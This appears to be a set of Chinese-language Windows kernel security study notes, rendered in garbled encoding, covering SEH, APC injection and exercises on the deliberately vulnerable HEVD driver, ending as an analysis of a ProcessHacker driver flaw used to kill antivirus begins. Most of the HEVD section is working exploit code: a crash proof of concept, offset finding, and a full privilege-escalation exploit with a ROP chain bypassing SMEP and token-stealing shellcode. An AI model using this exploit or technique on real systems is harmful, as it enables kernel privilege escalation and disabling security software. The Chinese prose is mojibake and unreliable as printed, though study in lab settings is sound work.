<p>RtlGetVersion å‡½æ•°æ˜¯ Windows å†…æ ¸ API ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºè·å–æœ‰å…³å½“å‰è¿è¡Œçš„æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬ä¿¡æ¯ã€‚å®ƒæ˜¯ GetVersionEx å‡½æ•°çš„å†…æ ¸æ¨¡å¼ç­‰ä»·ç‰©ã€‚</p>
<pre><code class="language-C">NTSTATUS RtlGetVersion(
  _Out_ PRTL_OSVERSIONINFOW lpVersionInformation
);
</code></pre>
<p>ç”¨æ³•</p>
<pre><code class="language-c">RTL_OSVERSIONINFOW osvi;
osvi.dwOSVersionInfoSize = sizeof(osvi);

NTSTATUS status = RtlGetVersion(&amp;osvi);

if (NT_SUCCESS(status)) {
  printf(&quot;Major version: %u\n&quot;, osvi.dwMajorVersion);
  printf(&quot;Minor version: %u\n&quot;, osvi.dwMinorVersion);
  printf(&quot;Build number: %u\n&quot;, osvi.dwBuildNumber);
  printf(&quot;Service pack: %u\n&quot;, osvi.szCSDVersion[0]);
} else {
  printf(&quot;Failed to get OS version information\n&quot;);
}

</code></pre>
<h2 id="seh_1">SEH</h2>
<p>__except å¼‚å¸¸è¿‡æ»¤å™¨çš„è¿”å›å€¼</p>
<pre><code class="language-C">EXCEPTION_EXECUTE_HANDLER   //EXCEPTION_EXECUTE_HANDLERçš„è¿”å›å€¼å‘SEHå‘å‡ºä¿¡å·ï¼Œä»¥æ‰§è¡Œ__exceptå—ä¸­çš„ä»£ç ã€‚
EXCEPTION_CONTINUE_SEARCH   
//EXCEPTION_CONTINUE_SEARCHçš„è¿”å›å€¼å‘SEHå‘å‡ºä¿¡å·ï¼Œè®©å®ƒç»§ç»­åœ¨å…¶ä»–åœ°æ–¹æœç´¢å¤„ç†ç¨‹åº
//å½“å¤„ç†ç¨‹åºè¿”å›ExceptionContinueSearchæ—¶ï¼Œè¿™æ„å‘³ç€å¤„ç†ç¨‹åºå¯¹å½“å‰å¼‚å¸¸çš„æ¢å¤ä¸æ„Ÿå…´è¶£ã€‚å› æ­¤ï¼Œæ“ä½œç³»ç»Ÿå°†è½¬åˆ°ä¸‹ä¸€ä¸ª_EXCEPTION_REGISTRATION_RECORDå¹¶æ‰§è¡Œå…¶å¤„ç†ç¨‹åºã€‚
//å¦‚æœæ‰€æœ‰å¤„ç†ç¨‹åºä¸ä¼šç®¡ç†å½“å‰å¼‚å¸¸,æ“ä½œç³»ç»Ÿå°†è°ƒç”¨å½“å‰æœªå¤„ç†çš„å¼‚å¸¸è¿‡æ»¤å™¨ã€‚å¼€å‘äººå‘˜å¯èƒ½ä¼šè°ƒç”¨UnhandledExceptionFilter()APIå®‰è£…è‡ªå®šä¹‰è¿‡æ»¤å™¨ã€‚ä½†æ˜¯,è¯·æ³¨æ„,æœªå¤„ç†çš„å¼‚å¸¸è¿‡æ»¤å™¨()å¹¶ä¸æ˜¯å‰é¢æåˆ°çš„å¼‚å¸¸å¤„ç†ç¨‹åºåˆ—è¡¨çš„ä¸€éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´,æ²¡æœ‰_exception _register _register _recordç»“æ„,å®ƒå°†æŒ‡å‘è¿™ä¸ªå‡½æ•°

EXCEPTION_CONTINUE_EXECUTION  //EXCEPTION_CONTINUE_EXECUTIONçš„è¿”å›å€¼å‘SEHå‘å‡ºä¿¡å·ï¼Œè®©å®ƒé‡æ–°æ‰§è¡Œå¯¼è‡´å¼‚å¸¸çš„ç›¸åŒä»£ç (åœ¨æˆ‘ä»¬çš„ç¤ºä¾‹ä¸­ï¼Œè¿™æ˜¯é™¤æ³•ä»£ç )ã€‚
</code></pre>
<p>SEHæ˜¯åŸºäºçº¿ç¨‹çš„</p>
<p>TIBä¸­çš„ç»“æ„</p>
<pre><code class="language-C">typedef struct _NT_TIB {
    struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList;   //ç¬¬ä¸€ä¸ªæˆå‘˜æŒ‡å‘_EXCEPTION_REGISTRATION_RECORDç»“æ„çš„æŒ‡é’ˆ
    PVOID StackBase;
    PVOID StackLimit;
    PVOID SubSystemTib;
#if defined(_MSC_EXTENSIONS)
    union {
        PVOID FiberData;
        DWORD Version;
    };
#else
    PVOID FiberData;
#endif
    PVOID ArbitraryUserPointer;
    struct _NT_TIB *Self;
} NT_TIB;
typedef NT_TIB *PNT_TIB;
</code></pre>
<p><code>_EXCEPTION_REGISTRATION_RECORD</code>çš„ä¸€ä¸ªæˆå‘˜æ˜¯ä¸‹ä¸€ä¸ª<code>_EXCEPTION_REGISTRATION_RECORD</code>çš„æŒ‡é’ˆã€‚<code>_EXCEPTION_REGISTRATION_RECORD</code>æ˜¯å¼‚å¸¸å¤„ç†çš„é“¾è¡¨</p>
<pre><code class="language-C">typedef struct _EXCEPTION_REGISTRATION_RECORD {
    struct _EXCEPTION_REGISTRATION_RECORD *Next;
    PEXCEPTION_ROUTINE Handler;
} EXCEPTION_REGISTRATION_RECORD;
</code></pre>
<p>å½“å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œæ“ä½œç³»ç»ŸæŸ¥çœ‹å‘ç”Ÿæ•…éšœçš„çº¿ç¨‹çš„TIBï¼Œå¹¶æ£€ç´¢ä¸€ä¸ªæŒ‡å‘TIBä¸­åŒ…å«çš„_EXCEPTION_REGISTRATION_RECORDç»“æ„çš„æŒ‡é’ˆã€‚ç„¶åï¼Œæ“ä½œç³»ç»Ÿå¯¼èˆªåˆ°EXCEPTION_ROUTINEä¾‹ç¨‹çš„é“¾è¡¨ï¼Œå¹¶ç¡®å®šè¿™äº›ä¾‹ç¨‹ä¸­æ˜¯å¦æœ‰ä»»ä½•ä¾‹ç¨‹å°†å¤„ç†å¼‚å¸¸</p>
<h2 id="apc">APC</h2>
<p>APC(å¼‚æ­¥è¿‡ç¨‹è°ƒç”¨)æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå¯ä»¥åœ¨Windowsä¸­ç”¨äºåœ¨ç‰¹å®šçº¿ç¨‹çš„ä¸Šä¸‹æ–‡ä¸­æ’é˜Ÿå®Œæˆä½œä¸šã€‚</p>
<p>å½“è°ƒç”¨å¼‚æ­¥RPCæ–¹æ³•æ—¶ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªAPCä¾‹ç¨‹çš„åœ°å€ï¼Œè¯¥ä¾‹ç¨‹å°†åœ¨RPCæ–¹æ³•å®Œæˆæ—¶æ‰§è¡Œã€‚</p>
<p>ç”¨æˆ·æ¨¡å¼ä¸‹çš„ä¸¤ç§APC
- ç”¨æˆ·APC:æ™®é€šç±»å‹çš„ç”¨æˆ·APCï¼Œä»…åœ¨çº¿ç¨‹å¤„äºAlertableçŠ¶æ€æ—¶è¿è¡Œ
- ç‰¹æ®Šç”¨æˆ·APC: RS5(windows10 October 2018)ä¸­æ·»åŠ çš„ä¸€ç§ç›¸å¯¹è¾ƒæ–°çš„APCç±»å‹ï¼Œå¼ºåˆ¶çº¿ç¨‹è¿›å…¥Alertableã€‚(MSå°šæœªè¯å®)</p>
<p>ç”¨æˆ·æ¨¡å¼ä¸‹ï¼Œåªæœ‰å½“çº¿ç¨‹å¤„äº<code>Alertable</code>ã€<code>NtTestAlert(æµ‹è¯•)</code>çŠ¶æ€æ—¶ï¼Œæ‰ä¼šè§¦å‘APCï¼Œä½¿ç”¨APCæ³¨å…¥ï¼Œéœ€è¦è®©è¿›ç¨‹å¤„äºä»¥ä¸ŠçŠ¶æ€ã€‚</p>
<p>ç‰¹æ®Šç”¨æˆ·APCä½¿ç”¨<code>NtQueueApcThreadEx</code>ã€<code>NtQueueApcThreadEx2</code> </p>
<h2 id="_39">å†…æ ¸å­¦ä¹ </h2>
<h3 id="hevd">HEVDé©±åŠ¨ç»ƒä¹ </h3>
<p>é€šè¿‡è¾“å…¥è¾“å‡ºæ§åˆ¶ ï¼ˆIOCTLï¼‰ è®¿é—®è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚
ä½¿ç”¨<code>DeviceIoControl()</code>å‡½æ•°å‘é©±åŠ¨å¯¹è±¡å‘é€æ¶ˆæ¯ã€‚</p>
<p>å®‰è£…é©±åŠ¨ã€‚ç”±äºæ˜¯æ— ç­¾åçš„ï¼ŒWindowsä¼šé˜»æ­¢å¯åŠ¨é©±åŠ¨ï¼Œéœ€è¦åœ¨Windows debugæ¨¡å¼ä¸‹å¯åŠ¨</p>
<pre><code>sc create HEVD binPath= C:\Users\admin\Desktop\x64\HEVD.sys type= kernel
sc start HEVD
</code></pre>
<p>é©±åŠ¨å·²åŠ è½½
<img alt="" src="../../images/Snipaste_2023-12-12_17-19-21.jpg" /></p>
<p><img alt="" src="../../images/Snipaste_2023-12-12_17-21-08.jpg" /></p>
<h4 id="0x800">0x800 ç¼“å†²åŒºæº¢å‡º</h4>
<p>ç¼“å†²åŒºæº¢å‡ºï¼Œäº§ç”Ÿé—®é¢˜çš„å‡½æ•°æ˜¯<code>TriggerBufferOverflowStack</code>ã€‚</p>
<p>æ‰¾åˆ°å‡½æ•°åœ°å€
<img alt="" src="../../images/Snipaste_2023-12-12_17-26-28.jpg" /></p>
<p>åœ¨å‡½æ•°è¿”å›å¤„ä¸‹æ–­ç‚¹ï¼Œè¿è¡ŒPocè§‚å¯Ÿå¯„å­˜å™¨çš„å€¼
<img alt="" src="../../images/Snipaste_2023-12-12_17-27-54.jpg" /></p>
<p>æ‰“è“å±Poc</p>
<pre><code class="language-C++">#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;

#define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;   //é©±åŠ¨å¯¹è±¡è·¯å¾„
//#define DEVICE_NAME   &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;    
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS) // ä¸€ä¸ªå®ï¼Œä»ç¼–å·è·å–IOCTL
#define STACK_OVERFLOW_IOCTL_NUMBER     IOCTL(0x800)   //äº§ç”Ÿé—®é¢˜çš„é©±åŠ¨IOCTLç¼–å·0x800

using namespace std;


HANDLE get_handle() {
    HANDLE h = CreateFileA(DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);
     //CreateFileA æ‰“å¼€é©±åŠ¨å¯¹è±¡è¿”å›å¥æŸ„

    if (h == INVALID_HANDLE_VALUE) {
        printf(&quot;Failed to get handle =(\n&quot;);
        return NULL;
    }
    else {
        printf(&quot;Success to get handle,0x%x&quot;,h);
    }
    return h;
}

//get_handleå‡½æ•°ä»é©±åŠ¨å¯¹è±¡è·¯å¾„ä¸­è·å–å¥æŸ„



void do_buffer_overflow(HANDLE h)
{
    SIZE_T in_buffer_size = 0x1000;     
    PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);   //åˆ†é…å †ç©ºé—´
    memset((char*)in_buffer, 'A', in_buffer_size);   //å¾€å †ä¸­å†™å…¥0x1000ä¸ªA
    printf(&quot;Sending buffer.\n&quot;);
    bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);  //ä½¿ç”¨DeviceIoControl()å¾€æŒ‡å®šç¼–å·çš„é©±åŠ¨å¯¹è±¡å‘é€æ•°æ®
    if (!result)
    {
        printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
    }
    HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
}


int main()
{
    HANDLE h = get_handle();
    do_buffer_overflow(h);
    //std::cout &lt;&lt; &quot;Hello World!\n&quot;;
}


</code></pre>
<p>è§‚å¯Ÿè¿è¡ŒPocåå¯„å­˜å™¨çš„å€¼ï¼Œå¤šä¸ªå¯„å­˜å™¨çš„å€¼è¢«è¦†ç›–ï¼Œrspå¤„çš„ä»£ç è¢«è¦†ç›–</p>
<p><img alt="" src="../../images/Snipaste_2023-12-12_17-32-13.jpg" /></p>
<p>è“å±
<img alt="" src="../../images/Snipaste_2023-12-12_17-34-53.jpg" /></p>
<p>æ²¡æœ‰æº¢å‡ºåˆ°rspï¼Œè€Œæ˜¯æº¢å‡ºåˆ°rspçš„åœ°å€</p>
<p>å°è¯•æ‰¾å‡ºæº¢å‡ºä½ç½®
<img alt="" src="../../images/Snipaste_2023-12-13_11-05-51.jpg" /></p>
<p>æŸ¥çœ‹rspåœ°å€çš„å€¼å·²ç»è¢«è¦†ç›–</p>
<pre><code class="language-c">1: kd&gt; d fffff88b53f177b8
fffff88b`53f177b8  30 43 72 31 43 72 32 43-72 33 43 72 34 43 72 35  0Cr1Cr2Cr3Cr4Cr5
fffff88b`53f177c8  43 72 36 43 72 37 43 72-38 43 72 39 00 00 00 00  Cr6Cr7Cr8Cr9....
fffff88b`53f177d8  18 00 00 00 00 00 00 00-01 00 00 00 00 00 00 00  ................
fffff88b`53f177e8  53 52 42 85 04 f8 ff ff-10 15 5b 6c 85 a4 ff 7f  SRB.......[l....
fffff88b`53f177f8  ff ff ff ff 00 00 00 00-d0 82 42 85 04 f8 ff ff  ..........B.....
fffff88b`53f17808  03 20 22 00 00 00 00 00-c0 70 5b 6c 85 a4 ff ff  . &quot;......p[l....
fffff88b`53f17818  79 8f 03 80 04 f8 ff ff-c0 42 52 6b 85 a4 ff ff  y........BRk....
fffff88b`53f17828  02 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
</code></pre>
<pre><code class="language-bash">â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# msf-pattern_offset -q 31724330
[*] Exact match at offset 2072
</code></pre>
<p>ç”±æ­¤å¯ä»¥çŸ¥é“æº¢å‡ºç‚¹åœ¨2072ä¸ªå­—ç¬¦åã€‚</p>
<p>SMEPçš„å¹²æ‰°
Supervisor Mode Execition Preventionï¼ˆSMEPï¼‰æ˜¯åœ¨å†…æ ¸æ¨¡å¼ä¸‹çš„ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œä¸å…è®¸åœ¨æŸäº›å†…å­˜ç©ºé—´æ‰§è¡Œä»£ç ï¼Œå¦åˆ™ä¼šç›´æ¥è“å±ã€‚</p>
<p>å¦‚ä½•ç»•è¿‡
- ROPç»•è¿‡
- KPTIç»•è¿‡
    å¦‚æœç³»ç»Ÿå¯ç”¨äº† KPTIï¼Œåˆ™æ¶æ„ä»£ç æ— æ³•ç›´æ¥è®¿é—®å†…æ ¸å†…å­˜ã€‚ä½†æ˜¯ï¼Œæ¶æ„ä»£ç ä»ç„¶å¯ä»¥é€šè¿‡æ¼æ´æˆ–å…¶ä»–æ”»å‡»æ–¹å¼ä¿®æ”¹å†…æ ¸å†…å­˜æ˜ å°„è¡¨ã€‚å¦‚æœæ¶æ„ä»£ç æˆåŠŸä¿®æ”¹äº†å†…æ ¸å†…å­˜æ˜ å°„è¡¨ï¼Œåˆ™æ¶æ„ä»£ç ä»ç„¶å¯ä»¥è®¿é—®å†…æ ¸å†…å­˜</p>
<p>æµç¨‹
- ä½¿ç”¨<code>ExAllocatePoolWithTag()</code>åˆ†é…å¯æ‰§è¡Œçš„ä¸å¯åˆ†é¡µå†…å­˜æ± 
- ä½¿ç”¨<code>RtlCopyMemory</code>ä»ç”¨æˆ·æ¨¡å¼å¤åˆ¶shellcode
    éœ€è¦ä»ntoskrnlè·å–å‡½æ•°åœ°å€æ‰å¯ä½¿ç”¨ä¸¤ä¸ªå‡½æ•°
- é‡å®šå‘æ‰§è¡Œæµ</p>
<p>ä¸ºäº†ä»éšæœºåœ°å€ç©ºé—´ä¸­è·å–å‡½æ•°çš„åœ°å€ï¼Œéœ€è¦é€šè¿‡Psapiæ¥æšä¸¾æŒ‡å®šé©±åŠ¨çš„é•œåƒåŸºå€</p>
<pre><code class="language-C">#include &lt;Windows.h&gt;
#include &lt;Psapi.h&gt;
...
unsigned long long get_kernel_base_addr() {
    LPVOID drivers[1024];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded);

    return (unsigned long long)drivers[0];
}
</code></pre>
<p>é€šè¿‡å‡½æ•°åç§°è·å–è¯¦ç»†åœ°å€</p>
<pre><code class="language-C">PVOID get_kernel_symbol_addr(const char *symbol) {
    PVOID kernelBaseAddr;
    HMODULE userKernelHandle;
    PCHAR functionAddress;
    unsigned long long offset;

    kernelBaseAddr = (PVOID)get_kernel_base_addr();  // é€šè¿‡get_kernel_base_addrè·å–é•œåƒåŸºå€
    userKernelHandle = LoadLibraryA(&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;);  // è·å–ntoskrnlå¥æŸ„

    if (userKernelHandle == INVALID_HANDLE_VALUE) {

        return NULL;
    }

    functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // æ ¹æ®ç¬¦å·åç§°ï¼ˆå‡½æ•°åç§°ï¼‰è·å–åœ°å€
    if (functionAddress == NULL) {
        return NULL;
    }

    offset = functionAddress - ((PCHAR)userKernelHandle);  // å‡½æ•°åœ°å€-ntoskrnlå¥æŸ„åˆå§‹åœ°å€ = å‡½æ•°åç§»é‡
    return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // è¿”å›å½“å‰å†…å­˜ä¸­çš„å‡½æ•°å®é™…åœ°å€ï¼Œå½“å‰é•œåƒåŸºå€+å‡½æ•°åç§»é‡
}
</code></pre>
<p>expä»£ç ï¼Œææƒ</p>
<pre><code class="language-C">#include &lt;iostream&gt;
#include &lt;string&gt;
#include &lt;Windows.h&gt;
#include &lt;Psapi.h&gt;

// Name of the device
#define DEVICE_NAME &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;
#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)

//å®šä¹‰ROPæŒ‡ä»¤
unsigned long long g_add_rsp_20h_ret = 0xa155de;


unsigned long long g_pop_rdi_pop_r14_pop_rbx_ret = 0x20a518;
unsigned long long g_xor_ecx_ecx_mov_rax_rcx_ret = 0x38cf53;
unsigned long long g_pop_rdx_ret = 0x416748;
unsigned long long g_push_rax_pop_rbx_ret = 0x20a263;
unsigned long long g_push_rax_pop_r13_ret = 0x5af724;
unsigned long long g_xchg_r8_r13_ret = 0x2c0da6;
unsigned long long g_mov_rcx_r8_mov_rax_rcx_ret = 0x93ac7a;
unsigned long long g_pop_r8_ret = 0x2017f1;
unsigned long long g_jmp_rbx = 0x408aa2;
unsigned long long kernel_ExAllocatePoolWithTag;
unsigned long long kernel_sysret = 0xa13dc0;
unsigned long long kernel_memcpy;




DWORD pid;

typedef struct sSepTokenPrivileges {
    UINT8 present;
    UINT8 enabled;
    UINT8 enabled_by_default;
} SEP_TOKEN_PRIVILEGES;

typedef NTSTATUS(*_PsLookupProcessByProcessId)(IN HANDLE, OUT PVOID*);
_PsLookupProcessByProcessId kernel_PsLookupProcessByProcessId;

typedef PVOID(*_PsReferencePrimaryToken)(PVOID);
_PsReferencePrimaryToken kernel_PsReferencePrimaryToken;


// æšä¸¾é©±åŠ¨é•œåƒåŸºå€
unsigned long long get_kernel_base_addr() {
    LPVOID drivers[1024];
    DWORD cbNeeded;

    EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded);

    return (unsigned long long)drivers[0];
}

// æ‰“å¼€é©±åŠ¨å¯¹è±¡ï¼Œè·å–é©±åŠ¨å¥æŸ„
HANDLE get_handle() {
    HANDLE h = CreateFileA(DEVICE_NAME,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (h == INVALID_HANDLE_VALUE) {
        printf(&quot;Failed to get handle =(\n&quot;);
        return NULL;
    }
    return h;
}

// å¤åˆ¶ROP payload
void add_to_payload(char* in_buffer, SIZE_T* offset, unsigned long long* data, SIZE_T size)
{
    memcpy(in_buffer + *offset, data, size);
    printf(&quot;Wrote %lx to offset %u\n&quot;, *data, *offset);
    *offset += size;
}

//è·å–å‡½æ•°çš„å†…å­˜åœ°å€
PVOID get_kernel_symbol_addr(const char* symbol) {
    PVOID kernelBaseAddr;
    HMODULE userKernelHandle;
    PCHAR functionAddress;
    unsigned long long offset;

    kernelBaseAddr = (PVOID)get_kernel_base_addr();  // Loads kernel base address
    userKernelHandle = LoadLibraryA(&quot;C:\\Windows\\System32\\ntoskrnl.exe&quot;);  // Gets kernel binary

    if (userKernelHandle == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    functionAddress = (PCHAR)GetProcAddress(userKernelHandle, symbol);  // Finds given symbol
    if (functionAddress == NULL) {
        // Could not find symbol
        return NULL;
    }

    offset = functionAddress - ((PCHAR)userKernelHandle);  // Subtracts the loaded binary's base address from the found address. This way, we will find the offset of the symbol for base address 0.
    return (PVOID)(((PCHAR)kernelBaseAddr) + offset);  // Adds the offset to the leaked base address.
}

void adjust_offsets()
{
    unsigned long long kernel_base_addr = get_kernel_base_addr();
    g_xor_ecx_ecx_mov_rax_rcx_ret += kernel_base_addr;
    g_pop_rdi_pop_r14_pop_rbx_ret += kernel_base_addr;
    g_add_rsp_20h_ret += kernel_base_addr;
    g_pop_rdx_ret += kernel_base_addr;
    g_push_rax_pop_rbx_ret += kernel_base_addr;
    g_push_rax_pop_r13_ret += kernel_base_addr;
    g_xchg_r8_r13_ret += kernel_base_addr;
    g_mov_rcx_r8_mov_rax_rcx_ret += kernel_base_addr;
    g_pop_r8_ret += kernel_base_addr;
    g_jmp_rbx += kernel_base_addr;

    kernel_sysret += kernel_base_addr;
    kernel_ExAllocatePoolWithTag = (unsigned long long) get_kernel_symbol_addr(&quot;ExAllocatePoolWithTag&quot;);
    kernel_memcpy = (unsigned long long) get_kernel_symbol_addr(&quot;memcpy&quot;);
    kernel_PsLookupProcessByProcessId = (_PsLookupProcessByProcessId)get_kernel_symbol_addr(&quot;PsLookupProcessByProcessId&quot;);
    kernel_PsReferencePrimaryToken = (_PsReferencePrimaryToken)get_kernel_symbol_addr(&quot;PsReferencePrimaryToken&quot;);
    printf(&quot;Primary token: %xu \n&quot;, (ULONGLONG)kernel_PsReferencePrimaryToken - kernel_base_addr);
    printf(&quot;PsReferencePrimaryToken base addr: %xu\n&quot;, (ULONGLONG)kernel_PsReferencePrimaryToken - (ULONGLONG)kernel_base_addr);
}


DWORD spawnCmd() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    wchar_t cmd[] = L&quot;C:\\Windows\\System32\\cmd.exe&quot;;

    ZeroMemory(&amp;si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&amp;pi, sizeof(pi));

    // Start the child process. 
    if (!CreateProcessW(NULL,   // No module name (use command line)
        cmd,                    // Command line
        NULL,                   // Process handle not inheritable
        NULL,                   // Thread handle not inheritable
        FALSE,                  // Set handle inheritance to FALSE
        CREATE_NEW_CONSOLE,     // No creation flags
        NULL,                   // Use parent's environment block
        NULL,                   // Use parent's starting directory 
        &amp;si,                    // Pointer to STARTUPINFO structure
        &amp;pi)                    // Pointer to PROCESS_INFORMATION structure
        )
    {
        printf(&quot;CreateProcess failed (%d).\n&quot;, GetLastError());
        return -1;
    }

    return pi.dwProcessId;
}

//æ‰§è¡ŒROPä»£ç åè¿”å›ç”¨æˆ·ç©ºé—´çš„shellcodeï¼Œå¦åˆ™ç³»ç»Ÿä¼šè“å±
char* generate_shellcode() {
    char* shellcode = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x4e + 11);
    memcpy(shellcode, &quot;\x48\xc7\xc1\x78\x56\x34\x12\x48\x83\xec\x08\x48\x89\xe2\x48\xbb\x00\x00\x00\x00\xff\xff\xff\xff\xff\xd3\x48\x8b\x0c\x24\x48\xbb\x10\x32\x34\x12\xff\xff\xff\xff\xff\xd3\x48\x83\xc0\x40\x48\xb9\xfc\xff\xff\xff\x00\x00\x00\x00\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc0\x08\x48\x89\x08\x48\x83\xc4\x08\x48\xBB\xC0\x0D\x02\x1B\x05\xF8\xFF\xFF\xFF\xE3&quot;, 0x4e + 11); 
    memcpy(shellcode + 3, &amp;pid, 4);
    memcpy(shellcode + 16, &amp;kernel_PsLookupProcessByProcessId, 8);
    memcpy(shellcode + 32, &amp;kernel_PsReferencePrimaryToken, 8);
    memcpy(shellcode + 0x4e + 1, &amp;kernel_sysret, 8);
    return shellcode;
}

//Does everything
void do_buffer_overflow(HANDLE h)
{
    SIZE_T in_buffer_size = 2072 + 8 * 15 + 0x20;
    PULONG in_buffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, in_buffer_size);
    memset((char*)in_buffer, 'A', in_buffer_size);

    SIZE_T offset = 2072;

    pid = spawnCmd();
    adjust_offsets();
    char* shellcode = generate_shellcode();

    unsigned long long size_of_copy = 0x4e + 11;

    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_xor_ecx_ecx_mov_rax_rcx_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_rdx_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;size_of_copy, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;kernel_ExAllocatePoolWithTag, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_add_rsp_20h_ret, 8);
    offset += 0x20;

    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_push_rax_pop_rbx_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_push_rax_pop_r13_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_xchg_r8_r13_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_mov_rcx_r8_mov_rax_rcx_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_rdx_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, (unsigned long long*)(&amp;shellcode), 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_pop_r8_ret, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;size_of_copy, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;kernel_memcpy, 8);
    add_to_payload((char*)in_buffer, &amp;offset, &amp;g_jmp_rbx, 8);


    system(&quot;pause&quot;);
    printf(&quot;Sending buffer.\n&quot;);
    bool result = DeviceIoControl(h, STACK_OVERFLOW_IOCTL_NUMBER, in_buffer, (DWORD)in_buffer_size, NULL, 0, NULL, NULL);
    if (!result)
    {
        printf(&quot;IOCTL Failed: %X\n&quot;, GetLastError());
    }
    //Frees allocated memory
    HeapFree(GetProcessHeap(), 0, (LPVOID)in_buffer);
}


int main(int argc, char** argv)
{
    do_buffer_overflow(get_handle());
    system(&quot;pause&quot;);
}
</code></pre>
<h3 id="processhacker">ProcessHackeré©±åŠ¨æ¼æ´åˆ†æ</h3>
<h4 id="_40">ä»‹ç»</h4>
<p>ProcessHackerçš„2.8.0.0ç‰ˆæœ¬çš„é©±åŠ¨ç¨‹åº<code>kprocesshacker.sys</code>å­˜åœ¨æ¼æ´ï¼Œè¯¥é©±åŠ¨æ˜¯æ•°å­—ç­¾åçš„ï¼Œåˆ©ç”¨é©±åŠ¨æ¼æ´å¯ä»¥åœ¨R0ä¸‹ç»“æŸè¿›ç¨‹ã€æš‚åœè¿›ç¨‹ï¼Œä¸”å¯ç»“æŸè‡ªæˆ‘é˜²æŠ¤ä¸ä¸¥æ ¼çš„æ€æ¯’è½¯ä»¶ã€‚</p>
<h4 id="_41">ç›®çš„</h4>
<p>ä»¥æ¼æ´åˆ©ç”¨å·¥å…·å…¥æ‰‹ï¼Œåˆ†ææ¼æ´ç‚¹ä»¥å¢å¼ºçŸ¥è¯†ç†è§£å’Œè°ƒè¯•ç†Ÿç»ƒåº¦</p>
<h4 id="_42">å¯»æ‰¾æ¼æ´ç‚¹</h4>
<p>å…ˆæ£€éªŒä¸€ä¸‹ProcessHackerèƒ½å¦æ€ç«ç»’
<img alt="" src="../../images/Snipaste_2023-12-13_15-33-14.jpg" /></p>
<p>ç«ç»’ç›´æ¥è¢«æ€äº†ä¸”æ²¡æœ‰é‡æ–°å¯åŠ¨
<img alt="" src="../../images/Snipaste_2023-12-13_15-33-54.jpg" /></p>
<p>æ—¢ç„¶æ˜¯ç»“æŸè¿›ç¨‹ï¼Œå¯èƒ½ç”¨åˆ°äº†<code>ZwTerminateProcess</code>ã€‚
ä¹Ÿæœ‰å…¶ä»–ä½¿ç”¨éå…¬å¼€å†…æ ¸å‡½æ•°çš„æ–¹æ³•æ¥ç»“æŸè¿›ç¨‹ï¼Œä½†ä¸€èˆ¬æ­£å¸¸çš„å·¥å…·åº”è¯¥ä¸ä¼šé‚£æ ·åšã€‚</p>
<p>ä¸ºäº†è¯å®è¿™ä¸€ç‚¹ï¼Œå¯ä»¥è°ƒè¯•ä¸€ä¸‹ç»“æŸè¿›ç¨‹æ“ä½œæ˜¯å¦çœŸçš„è°ƒç”¨äº†<code>ZwTerminateProcess</code>.</p>
